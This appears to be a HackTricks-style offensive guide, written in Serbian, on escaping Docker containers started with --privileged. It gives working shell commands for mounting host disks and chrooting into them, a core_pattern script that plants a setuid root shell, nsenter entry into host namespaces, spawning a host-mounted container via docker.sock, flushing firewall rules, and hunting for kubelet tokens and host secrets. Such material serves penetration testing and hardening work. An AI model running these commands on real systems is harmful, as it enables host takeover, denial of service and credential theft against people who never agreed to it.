# Izlazak iz `--privileged` kontejnera

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Kontejner pokrenut sa `--privileged` nije isto što i normalan kontejner sa jednom ili dve dodatne dozvole. U praksi, `--privileged` uklanja ili slabi nekoliko podrazumevanih runtime zaštita koje obično sprečavaju workload da pristupi opasnim resursima hosta. Tačan efekat i dalje zavisi od runtime-a i hosta, ali za Docker je uobičajen rezultat:

- dodeljuju se sve capabilities
- ograničenja device cgroup-a se uklanjaju
- mnogi kernel filesystems prestaju da se montiraju samo za čitanje
- podrazumevane maskirane procfs putanje nestaju
- seccomp filtering je onemogućen
- AppArmor confinement je onemogućen
- SELinux isolation je onemogućena ili zamenjena mnogo širim labelom

Važna posledica je da privileged kontejneru obično **nije** potreban suptilan kernel exploit. U mnogim slučajevima on može jednostavno direktno da komunicira sa device-ima hosta, kernel filesystem-ima dostupnim sa hosta ili runtime interfejsima, a zatim da pređe u shell na hostu.

## Šta `--privileged` Ne Menja Automatski

`--privileged` ne pridružuje automatski kontejner host PID, network, IPC ili UTS namespace-u. Privileged kontejner i dalje može imati privatne namespace-ove. To znači da neki escape chain-ovi zahtevaju dodatni uslov, kao što je:

- bind mount hosta
- deljenje host PID-a
- host networking
- vidljivi device-i hosta
- writable proc/sys interfejsi

Te uslove je često lako ispuniti u stvarnim pogrešnim konfiguracijama, ali su konceptualno odvojeni od samog `--privileged` parametra.

## Escape putanje

### 1. Montiranje Host Diska Kroz Izložene Device-e

Privileged kontejner obično vidi mnogo više device node-ova pod `/dev`. Ako je block device hosta vidljiv, najjednostavniji escape je da ga montira i pomoću `chroot` pređe u filesystem hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Ako root particija nije očigledna, prvo izlistajte raspored blokova:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Ako je praktičan pristup postavljanje setuid pomoćnog programa u host mount sa dozvolom za upisivanje umesto korišćenja `chroot`, imajte na umu da svaki filesystem ne podržava setuid bit. Brza provera mogućnosti sa host strane je:
```bash
mount | grep -v "nosuid"
```
Ovo je korisno zato što su putanje sa mogućnošću upisivanja unutar `nosuid` filesystema mnogo manje interesantne za klasične workflowe tipa „ubaci setuid shell i izvrši ga kasnije“.

Oslabljene zaštite koje se ovde zloupotrebljavaju su:

- potpuna izloženost uređaja
- široke capabilities, naročito `CAP_SYS_ADMIN`

Povezane stranice:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montirajte ili ponovo iskoristite Host Bind Mount i `chroot`

Ako je root filesystem hosta već montiran unutar containera, ili container može da kreira neophodne mountove zato što je privileged, shell hosta je često udaljen samo jedan `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ako ne postoji bind mount za host root, ali je host storage dostupan, napravite ga:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ovaj put zloupotrebljava:

- oslabljena mount ograničenja
- pune capabilities
- nedostatak MAC confinement-a

Povezane stranice:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Zloupotreba upisivog `/proc/sys` ili `/sys`

Jedna od velikih posledica opcije `--privileged` jeste da zaštite procfs-a i sysfs-a postaju znatno slabije. To može izložiti kernel interfejse okrenute ka hostu koji su obično maskirani ili montirani samo za čitanje.

Klasičan primer je `core_pattern`:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Drugi vredni path-ovi obuhvataju:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ovaj put zloupotrebljava:

- nedostajuće maskirane putanje
- nedostajuće putanje sistema samo za čitanje

Povezane stranice:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Korišćenje svih capabilities za bekstvo zasnovano na mount-u ili namespace-u

Privileged container dobija capabilities koje se obično uklanjaju iz standardnih container-a, uključujući `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` i mnoge druge. To je često dovoljno da se lokalni foothold pretvori u bekstvo na host čim postoji još neka izložena površina.

Jednostavan primer je montiranje dodatnih filesystem-a i korišćenje namespace entry-ja:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Ako se deli i PID hosta, korak postaje još kraći:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ovaj vektor zloupotrebljava:

- podrazumevani skup privilegovanih capabilities
- opcionalno deljenje host PID-a

Povezane stranice:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Bekstvo kroz runtime socket-e

Privileged container često dobija vidljivost nad stanjem ili socket-ima hosta. Ako je Docker, containerd ili CRI-O socket dostupan, najjednostavniji pristup često je korišćenje runtime API-ja za pokretanje drugog container-a sa pristupom hostu:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Za containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ovaj put zloupotrebljava:

- izlaganje privileged runtime-a
- host bind mounts kreirane kroz sam runtime

Povezane stranice:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Uklonite sporedne efekte izolacije mreže

`--privileged` sam po sebi ne priključuje container host network namespace-u, ali ako container takođe ima `--network=host` ili drugi pristup host mreži, kompletan mrežni stek postaje podložan izmenama:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Ovo nije uvek direktan host shell, ali može omogućiti denial of service, presretanje saobraćaja ili pristup management servisima dostupnim samo preko loopback-a.

Povezane stranice:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Čitanje Host Secrets I Runtime State-a

Čak i kada čist shell escape nije odmah moguć, privileged containers često imaju dovoljan pristup za čitanje host secrets-a, kubelet state-a, runtime metadata-e i filesystem-a susednih containers-a:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Ako je `/var` montiran sa hosta ili su runtime direktorijumi vidljivi, ovo može biti dovoljno za lateralno kretanje ili krađu cloud/Kubernetes akreditiva čak i pre dobijanja host shell-a.

Povezane stranice:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Provere

Svrha sledećih komandi je da potvrde koje su klase escape-a iz privileged container-a odmah izvodljive.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Šta je ovde zanimljivo:

- kompletan skup capabilities, naročito `CAP_SYS_ADMIN`
- writable proc/sys exposure
- vidljivi host uređaji
- nedostatak seccomp i MAC confinement-a
- runtime sockets ili bind mount-ovi host root-a

Bilo koja od ovih stavki može biti dovoljna za post-exploitation. Nekoliko njih zajedno obično znači da je kontejner funkcionalno udaljen od compromise-a hosta svega jednom ili dvema commands.

## Povezane stranice

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Reference

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
